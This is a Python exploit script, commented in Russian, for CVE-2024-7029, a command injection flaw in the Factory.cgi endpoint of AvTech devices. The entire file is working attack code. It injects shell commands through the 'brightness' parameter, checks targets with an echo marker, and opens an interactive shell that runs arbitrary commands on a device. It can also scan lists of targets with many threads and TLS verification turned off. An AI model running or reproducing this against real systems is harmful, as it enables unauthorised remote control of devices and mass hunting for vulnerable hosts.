import socket
import argparse
import requests
import threading
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.formatted_text import HTML
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

# Отключение предупреждений о небезопасных соединениях
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


# Класс для эксплуатации уязвимости
class AvTechRCEExploit:
    def __init__(self, target_url=None, targets_file=None, max_workers=10):
        self.target_url = target_url
        self.targets_file = targets_file
        self.max_workers = max_workers
        self.command = ""
        self.vuln_path = '/cgi-bin/supervisor/Factory.cgi'
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    # Генерирует полезную нагрузку для отправки на цель
    def _generate_payload(self, command=None):
        if command:
            return f'action=white_led&brightness=$({command} 2>&1) #'
        return 'action=white_led&brightness=$(echo%20CHECK_UNIQUE_VULN 2>&1) #'

    # Проверка на уязвимость цели путем отправки тестовой нагрузки
    def is_vulnerable(self):
        payload = self._generate_payload()
        try:
            response = requests.post(self.target_url + self.vuln_path, headers=self.headers, data=payload, timeout=10, verify=False)
            if "CHECK_UNIQUE_VULN" in response.text:
                print(f"[+] Обнаружена уязвимость на цели: {self.target_url}")
                return True
        except Exception as e:
            print(f"[-] Ошибка при проверке уязвимости: {e}")
        return False

    # Выполняет указанную команду на уязвимой цели
    def execute_command(self):
        payload = self._generate_payload(self.command)
        print("[*] Выполняется проверка уязвимости цели...")
        if self.is_vulnerable():
            try:
                response = requests.post(self.target_url + self.vuln_path, headers=self.headers, data=payload, timeout=10, verify=False)
                print(f"[+] Выполнение команды на цели: {response.text}")
            except Exception as e:
                print(f"[-] Ошибка во время эксплуатации: {e}")
        else:
            print("[-] Цель не уязвима")

    # Запуск интерактивной оболочки для отправки команд
    def start_interactive_session(self):
        print("[*] Запуск интерактивной оболочки...")
        session = PromptSession(history=InMemoryHistory())
        print("[+] Успешно открыта интерактивная оболочка")

        while True:
            try:
                cmd_input = session.prompt(HTML("<ansiyellow><b>Shell> </b></ansiyellow>"), default="").strip()
                if cmd_input.lower() == "exit":
                    print("[*] Завершение интерактивной оболочки")
                    break
                elif cmd_input.lower() == "clear":
                    self._clear_screen()
                    continue

                self.command = cmd_input
                self.execute_command()

            except KeyboardInterrupt:
                print("\n[-] Выход из интерактивной оболочки")
                break

    # Сканирует все цели из файла на уязвимость
    def scan_targets_from_file(self):
        try:
            with open(self.targets_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]

            with alive_bar(len(targets), title='Сканирование целей', bar="smooth", enrich_print=False) as progress_bar:
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    futures_to_target = {executor.submit(self._scan_single_target, target): target for target in targets}
                    for future in as_completed(futures_to_target):
                        progress_bar()

        except Exception as e:
            print(f"[-] Ошибка при сканировании из файла: {e}")

    # Сканирует одиночную цель на уязвимость
    def _scan_single_target(self, target):
        self.target_url = target
        if self.is_vulnerable():
            print(f"[+] Уязвимость обнаружена на цели: {target}")

    @staticmethod
    # Очищает консоль
    def _clear_screen():
        print("\033c", end="")


def main():
    # Парсинг аргументов командной строки
    parser = argparse.ArgumentParser(description="Эксплойт для CVE-2024-7029 - удаленное выполнение кода в устройствах AvTech by geniuszly")
    parser.add_argument("-u", "--url", type=str, help="URL цели для эксплуатации")
    parser.add_argument("-f", "--file", type=str, help="Файл с URL-ами целей")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Количество потоков для сканирования")

    args = parser.parse_args()

    # Логика для эксплуатации на основе переданных аргументов
    if args.url:
        exploit_instance = AvTechRCEExploit(target_url=args.url, max_workers=args.threads)
        exploit_instance.start_interactive_session()
    elif args.file:
        exploit_instance = AvTechRCEExploit(targets_file=args.file, max_workers=args.threads)
        exploit_instance.scan_targets_from_file()
    else:
        print("[-] Укажите URL цели или файл с целевыми URL.")
        parser.print_help()


if __name__ == "__main__":
    main()
